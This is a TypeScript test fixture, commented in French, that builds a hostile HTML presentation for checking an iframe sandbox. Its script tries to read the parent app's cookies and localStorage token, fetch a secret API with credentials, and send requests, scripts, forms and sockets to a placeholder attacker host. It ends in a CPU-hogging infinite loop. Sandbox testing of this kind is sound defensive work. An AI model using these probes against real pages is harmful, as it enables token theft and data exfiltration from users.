/**
 * Présentation malveillante du banc d'essai : elle tente une vingtaine d'attaques et rapporte
 * le résultat de chacune à l'application. Les marqueurs APP, EVIL et PARENT_ORIGIN sont remplacés.
 */
const SCRIPT = String.raw`
const APP = '__APP__';
const EVIL = '__EVIL__';
const results = [];
const note = (name, outcome, detail) => results.push({ name, outcome, detail: String(detail).slice(0, 120) });
const attempt = async (name, fn) => {
  try {
    // Une attaque qui reste en attente (par exemple une demande d'autorisation) est comptée comme bloquée.
    const value = await Promise.race([
      Promise.resolve().then(fn),
      new Promise((_, reject) => setTimeout(() => reject(new Error('TIMEOUT')), 3000)),
    ]);
    note(name, 'SUCCEEDED', value);
  } catch (error) {
    note(name, 'BLOCKED', error && error.name ? error.name : error);
  }
};
const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const probeEvent = (make) => new Promise((resolve) => {
  const timer = setTimeout(() => resolve('aucun événement'), 800);
  make((what) => { clearTimeout(timer); resolve(what); });
});

(async () => {
  note('script inline exécuté', 'SUCCEEDED', 'oui');

  await attempt('lire le DOM de l\'application', () => parent.document.title);
  await attempt('lire les cookies de l\'application', () => parent.document.cookie);
  await attempt('lire le localStorage de l\'application', () => parent.localStorage.getItem('token'));
  await attempt('lire ses propres cookies', () => {
    const value = document.cookie;
    if (value === '') throw new Error('vide');
    return value;
  });
  await attempt('lire son propre localStorage', () => localStorage.getItem('token') ?? (() => { throw new Error('vide'); })());
  await attempt('modifier le DOM de l\'application', () => { parent.document.body.setAttribute('data-pwned', '1'); return 'modifié'; });

  await attempt('naviguer la fenêtre principale', () => { top.location.href = EVIL + '/nav'; return 'tentative envoyée'; });
  await attempt('fetch vers l\'application avec cookies', async () => (await fetch(APP + '/api/secret', { credentials: 'include' })).text());
  await attempt('fetch vers un site externe', async () => (await fetch(EVIL + '/fetch', { mode: 'no-cors' })).type);
  await attempt('balise image vers un site externe', () => probeEvent((done) => {
    const image = new Image();
    image.onload = () => done('chargée');
    image.onerror = () => done('erreur');
    image.src = EVIL + '/beacon?x=1';
    if (image.complete && image.naturalWidth > 0) done('chargée');
  }).then((what) => { if (what === 'chargée') return what; throw new Error(what); }));
  await attempt('script externe injecté', () => probeEvent((done) => {
    const script = document.createElement('script');
    script.onload = () => done('chargé');
    script.onerror = () => done('erreur');
    script.src = EVIL + '/inject.js';
    document.head.appendChild(script);
  }).then((what) => { if (what === 'chargé') return what; throw new Error(what); }));
  await attempt('WebSocket vers un site externe', () => new Promise((resolve, reject) => {
    const socket = new WebSocket('ws://' + EVIL.replace(/^https?:\/\//, '') + '/ws');
    socket.onopen = () => resolve('ouverte');
    socket.onerror = () => reject(new Error('erreur'));
    setTimeout(() => reject(new Error('délai')), 800);
  }));
  await attempt('ouvrir une fenêtre', () => { const w = window.open(EVIL + '/popup'); if (!w) throw new Error('null'); return 'ouverte'; });
  await attempt('envoyer un formulaire', async () => {
    const form = document.createElement('form');
    form.action = EVIL + '/form'; form.method = 'GET';
    document.body.appendChild(form);
    form.submit();
    await wait(300);
    return 'soumis';
  });
  await attempt('accéder à la caméra', async () => { await navigator.mediaDevices.getUserMedia({ video: true }); return 'accordé'; });
  await attempt('enregistrer un service worker', async () => { await navigator.serviceWorker.register('/sw.js'); return 'enregistré'; });
  await attempt('cadre imbriqué vers l\'application', () => probeEvent((done) => {
    const nested = document.createElement('iframe');
    nested.onload = () => done('chargé');
    nested.onerror = () => done('erreur');
    nested.src = APP + '/framed';
    document.body.appendChild(nested);
  }).then((what) => { if (what === 'chargé') return what; throw new Error(what); }));
  // Attaques vérifiées côté serveur : aucune requête ne doit atteindre le serveur « attaquant ».
  await attempt('média externe', async () => { const audio = new Audio(EVIL + '/audio.mp3'); audio.load(); await wait(500); return 'demandé'; });
  await attempt('police externe', async () => {
    const style = document.createElement('style');
    style.textContent = '@font-face{font-family:x;src:url(' + EVIL + '/font.woff2)} h1{font-family:x}';
    document.head.appendChild(style);
    await wait(500);
    return 'demandée';
  });
  await attempt('objet externe', async () => { const o = document.createElement('object'); o.data = EVIL + '/object'; document.body.appendChild(o); await wait(500); return 'demandé'; });
  await attempt('feuille de style externe', async () => {
    const link = document.createElement('link');
    link.rel = 'stylesheet'; link.href = EVIL + '/style.css';
    document.head.appendChild(link);
    await wait(500);
    return 'demandée';
  });
  await attempt('worker externe', async () => { new Worker(EVIL + '/worker.js'); await wait(500); return 'demandé'; });
  await attempt('eval', () => eval('1+1'));
  await attempt('new Function', () => new Function('return 1')());

  // Messages : trois sont autorisés, deux ne le sont pas.
  parent.postMessage({ type: 'asset:upload', url: EVIL }, '*');
  parent.postMessage({ type: 'presentation:slide', index: '<script>', total: 1 }, '*');
  parent.postMessage({ type: 'presentation:ready' }, '*');
  parent.postMessage({ type: 'presentation:slide', index: 0, total: 3 }, '*');

  note('document.origin', 'SUCCEEDED', window.origin);
  parent.postMessage({ type: '__report', results }, '*');

  // Dernier coup : bloquer le processeur. L'application doit rester réactive.
  await wait(50);
  if (__HOG__) { while (true) { /* boucle infinie */ } }
})();
`;

export function payloadHtml(appUrl: string, evilUrl: string, hog = true): string {
  const script = SCRIPT.replace('__APP__', appUrl)
    .replace('__EVIL__', evilUrl)
    .replace('__HOG__', String(hog));
  return `<!doctype html><html><head><meta charset="utf-8"><title>présentation</title><style>body{font:24px sans-serif}</style></head><body><h1>Présentation de test</h1><script>${script}</script></body></html>`;
}
